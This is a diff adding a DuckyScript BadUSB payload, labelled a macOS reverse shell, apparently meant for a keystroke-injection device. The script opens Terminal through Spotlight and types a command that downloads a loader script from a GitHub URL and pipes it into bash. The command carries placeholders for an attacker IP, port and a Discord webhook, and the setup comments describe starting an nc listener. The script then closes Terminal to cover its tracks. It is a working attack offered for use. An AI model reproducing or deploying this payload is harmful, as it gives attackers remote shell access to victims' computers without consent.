@@ -1,0 +1,25 @@
+REM ============================================================
+REM 🔌 Reverse Shell - macOS
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: macOS
+REM Category: Execution
+REM
+REM SETUP:
+REM   1. Start listener: nc -lvnp 4444
+REM   2. Replace YOUR_IP with your IP
+REM   3. Replace YOUR_PORT with your port
+REM ============================================================
+DELAY 500
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING DC="YOUR_DISCORD_WEBHOOK" IP="YOUR_IP" PT="YOUR_PORT" M="shell" bash -c 'curl -sL https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh|bash' &
+ENTER
+DELAY 500
+STRING exit
+ENTER
